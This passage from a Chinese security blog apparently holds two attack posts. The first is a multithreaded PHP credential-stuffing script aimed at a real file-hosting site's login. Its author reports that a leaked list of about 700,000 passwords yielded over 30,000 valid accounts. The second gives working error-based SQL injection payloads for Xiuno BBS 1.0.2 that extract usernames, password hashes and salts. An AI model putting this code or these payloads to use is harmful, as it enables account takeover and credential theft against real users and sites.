class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">参考代码文章:www.searchtb.com/2012/06/rolling-curl-best-practices.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">//不显示错误</span></span><br><span class="line">ini_set(<span class="string">'memory_limit'</span>,<span class="number">-1</span>); <span class="comment">//内存设置最高</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> <span class="doctag">@params</span> $str 输入字符 $type 所需获取编码</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoiconv</span><span class="params">($str,$type = <span class="string">"gb2312//ignore"</span>)</span></span>&#123;</span><br><span class="line">    $utf32_big_endian_bom = chr(<span class="number">0x00</span>) . chr(<span class="number">0x00</span>) . chr(<span class="number">0xfe</span>) . chr(<span class="number">0xff</span>);</span><br><span class="line">  $utf32_little_endian_bom = chr(<span class="number">0xff</span>) . chr(<span class="number">0xfe</span>) . chr(<span class="number">0x00</span>) . chr(<span class="number">0x00</span>);</span><br><span class="line">  $utf16_big_endian_bom = chr(<span class="number">0xfe</span>) . chr(<span class="number">0xff</span>);</span><br><span class="line">  $utf16_little_endian_bom = chr(<span class="number">0xff</span>) . chr(<span class="number">0xfe</span>);</span><br><span class="line">  $utf8_bom = chr(<span class="number">0xef</span>) . chr(<span class="number">0xbb</span>) . chr(<span class="number">0xbf</span>);</span><br><span class="line">$first2 = substr($str, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">  $first3 = substr($str, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">  $first4 = substr($str, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ($first3 == $utf8_bom) $icon = <span class="string">'utf-8'</span>;</span><br><span class="line">    <span class="keyword">elseif</span> ($first4 == $utf32_big_endian_bom) $icon = <span class="string">'utf-32be'</span>;</span><br><span class="line">    <span class="keyword">elseif</span> ($first4 == $utf32_little_endian_bom) $icon = <span class="string">'utf-32le'</span>;</span><br><span class="line">    <span class="keyword">elseif</span> ($first2 == $utf16_big_endian_bom) $icon = <span class="string">'utf-16be'</span>;</span><br><span class="line">    <span class="keyword">elseif</span> ($first2 == $utf16_little_endian_bom) $icon = <span class="string">'utf-16le'</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123; $icon = <span class="string">'ascii'</span>; <span class="keyword">return</span> $str;&#125;</span><br><span class="line">    <span class="keyword">return</span> iconv($icon,$type,$str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"./include/RollingCurl.php"</span>); <span class="comment">//载入多线程类</span></span><br><span class="line"></span><br><span class="line">$threads=<span class="number">50</span>; <span class="comment">//线程</span></span><br><span class="line">$timeout=<span class="number">10</span>; <span class="comment">//设置超时</span></span><br><span class="line">$dic_file=<span class="string">'./dict/user.txt'</span>;<span class="comment">//设置加载字典文件</span></span><br><span class="line">$dict=file($dic_file);<span class="comment">//设置字典</span></span><br><span class="line">$count=count($dict);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'[info] 载入字典文件:'</span>.$dic_file.PHP_EOL ;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'[info] 加载 '</span>.$count.<span class="string">'行字典'</span>.PHP_EOL ;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'[info] 线程:'</span>.$threads.PHP_EOL ;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'[info] 超时设定:'</span>.$timeout.PHP_EOL ;</span><br><span class="line">usleep(<span class="number">500</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'[info] 程序初始化中...'</span>.PHP_EOL ;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">request_callback</span><span class="params">($response, $info, $request)</span> </span>&#123;</span><br><span class="line">$p= $request-&gt;post_data;</span><br><span class="line">preg_match(<span class="string">'/module\=member&amp;action\=validateLogin&amp;username\=(.*?)&amp;password\=(.*?)&amp;remember\=on/'</span>,$p,$mm);</span><br><span class="line">$user=$mm[<span class="number">1</span>];</span><br><span class="line">$pass=$mm[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断登录状态以及用户权限</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^Set-Cookie:[\s]+membership=(\d&#123;1&#125;).*?;+/mi'</span>, $response,$match)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'[!] 登录失败    '</span>.<span class="string">'用户名:'</span>.str_pad($user,<span class="number">18</span>,<span class="string">" "</span>).<span class="string">'密码:'</span>.str_pad($pass,<span class="number">18</span>,<span class="string">" "</span>).PHP_EOL;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$id=$match[<span class="number">1</span>];</span><br><span class="line">$id= intval(trim($id));</span><br><span class="line"><span class="keyword">if</span>($id==<span class="number">1</span>)&#123;$m=<span class="string">'普通会员'</span>;&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($id==<span class="number">2</span>)&#123;$m=<span class="string">'高级会员'</span>;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;        $m=<span class="string">'未知情况'</span>;&#125;</span><br><span class="line">$str= <span class="string">'[*] 登录成功    '</span>.<span class="string">'用户名:'</span>.str_pad($user,<span class="number">18</span>,<span class="string">" "</span>).<span class="string">'密码:'</span>.str_pad($pass,<span class="number">18</span>,<span class="string">" "</span>).<span class="string">'权限:'</span>.$m.PHP_EOL;</span><br><span class="line">file_put_contents(<span class="string">'./log/logins.txt'</span>,$str,FILE_APPEND); <span class="comment">//保存扫描结果</span></span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">$rc = <span class="keyword">new</span> RollingCurl(<span class="string">"request_callback"</span>);</span><br><span class="line"></span><br><span class="line">$rc-&gt;window_size = $threads; <span class="comment">//设置线程</span></span><br><span class="line">$rc-&gt;timeout = $timeout; <span class="comment">//设置超时</span></span><br><span class="line">$method=<span class="string">'POST'</span>;</span><br><span class="line"></span><br><span class="line">$u=<span class="keyword">array</span>(<span class="string">''</span>);</span><br><span class="line">$p=<span class="keyword">array</span>(<span class="string">''</span>);</span><br><span class="line">$url=<span class="string">'http://www.yunfile.com/view'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($dict <span class="keyword">as</span> $k=&gt; $s)&#123;</span><br><span class="line"><span class="keyword">list</span>($u[$k], $p[$k]) = explode(<span class="string">':'</span>,trim(autoiconv($s)));</span><br><span class="line">$username=$u[$k];</span><br><span class="line">$password=$p[$k];</span><br><span class="line">$username;</span><br><span class="line">$post_data=<span class="string">'module=member&amp;action=validateLogin&amp;username='</span>.$username.<span class="string">'&amp;password='</span>.$password.<span class="string">'&amp;remember=on'</span>;</span><br><span class="line">$request = <span class="keyword">new</span> RollingCurlRequest($url,$method,$post_data); <span class="comment">//CURLOPT_FOLLOWLOCATION=&gt;1 自动跳转  为0 不跳转</span></span><br><span class="line">$request-&gt;options = <span class="keyword">array</span>(CURLOPT_FOLLOWLOCATION =&gt; <span class="number">0</span>,</span><br><span class="line">                        CURLOPT_NOBODY =&gt; <span class="number">1</span>,</span><br><span class="line">                        CURLOPT_HEADER =&gt; <span class="number">1</span>                                                                                                );</span><br><span class="line">  </span><br><span class="line">    $rc-&gt;add($request);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$rc-&gt;execute();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/f7fbd1c9beda5e74dbee683271c916d8.png" alt="2019-07-19-04-25-40"><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/742129f624db4b0ad1f2d9f2232b8cdb.png" alt="2019-07-19-04-25-52"><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/8dcb1518743f3c7934f8b0049b4b52c3.png" alt="2019-07-19-04-26-04"><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/c9cdcefc02dc36477cfb424982bbced9.png" alt="2019-07-19-04-26-14"></p><p>加载了某市面上泄露的网盘 700075 行用户密码列表(大小 13mb)成功登录 30163个有效帐号<br>其中 495个高级会员<br>耗时 3小时</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>修罗(Xiuno 1.0.2)bbs 注入漏洞</title>
      <link href="/2011/11/23/Xiuno-sql/"/>
      <url>/2011/11/23/Xiuno-sql/</url>
      
        <content type="html"><![CDATA[<p>前段时间爆出 <strong>Xiuno bbs</strong> 后台拿shell<br>无意中翻了下代码发现 搜索型注入漏洞（POST）<br><code>magic_quotes_gpc = Off</code></p><p><strong>获取用户个数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' AND (<span class="keyword">SELECT</span> <span class="number">1600</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="number">0x6c6f7374776f6c667e</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">50</span>) <span class="keyword">FROM</span> www_userfield),<span class="number">0x7e7430306c73</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a) <span class="keyword">AND</span> <span class="string">'lost'</span>=<span class="string">'lost</span></span><br></pre></td></tr></table></figure><p><strong>获取用户名：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' AND (<span class="keyword">SELECT</span> <span class="number">3849</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="number">0x6c6f7374776f6c667e</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(username <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">50</span>) <span class="keyword">FROM</span> www_userfield <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e7430306c73</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a) <span class="keyword">AND</span> <span class="string">'lost'</span>=<span class="string">'lost</span></span><br></pre></td></tr></table></figure><p><strong>获取密码:</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' AND (<span class="keyword">SELECT</span> <span class="number">7750</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="number">0x6c6f7374776f6c667e</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">password</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">50</span>) <span class="keyword">FROM</span> www_userfield <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e7430306c73</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a) <span class="keyword">AND</span> <span class="string">'lost'</span>=<span class="string">'lost</span></span><br></pre></td></tr></table></figure><p><strong>获取salt:</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' AND (<span class="keyword">SELECT</span> <span class="number">7750</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="number">0x6c6f7374776f6c667e</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">salt</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">50</span>) <span class="keyword">FROM</span> www_userfield <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e7430306c73</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a) <span class="keyword">AND</span> <span class="string">'lost'</span>=<span class="string">'lost</span></span><br></pre></td></tr></table></figure><p><strong>一步获取</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' AND (<span class="keyword">SELECT</span> <span class="number">2861</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>((<span class="keyword">SELECT</span> <span class="keyword">concat</span>(<span class="number">0x757365726e616d653a</span>,username,<span class="number">0x3b70617373776f72643a</span>,<span class="keyword">password</span>,<span class="number">0x3a</span>,<span class="keyword">salt</span>)  <span class="keyword">FROM</span> www_userfield <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a) <span class="keyword">AND</span> <span class="string">'MOBL'</span>=<span class="string">'MOBL</span></span><br></pre></td></tr></table></figure><p><strong>note:</strong><br><code>LIMIT = 用户个数-1,1</code></p><p><code>xx FROM www_userfield where username=&#39;admin&#39;;</code></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
